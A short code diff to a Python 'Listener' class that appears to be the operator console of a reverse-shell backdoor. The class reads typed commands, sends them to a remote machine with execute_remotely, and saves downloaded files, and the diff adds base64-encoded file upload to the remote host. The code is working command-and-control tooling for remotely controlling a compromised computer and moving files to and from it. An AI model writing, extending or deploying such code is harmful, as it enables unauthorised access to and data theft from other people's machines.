@@ -39,14 +39,21 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, 'wb') as file:
-            content = content.encode()
             file.write(base64.b64decode(content))
             return '[+] Download successful.'
+
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
             command = input('>> ')  # str
             command = command.strip().split(' ')
+            if command[0] == 'upload':
+                file_content = self.read_file(command[1])
+                file_content = file_content.decode()
+                command.append(file_content)
             result = self.execute_remotely(command)  # str
             if command[0] == 'download':
                 result = self.write_file(command[1], result)
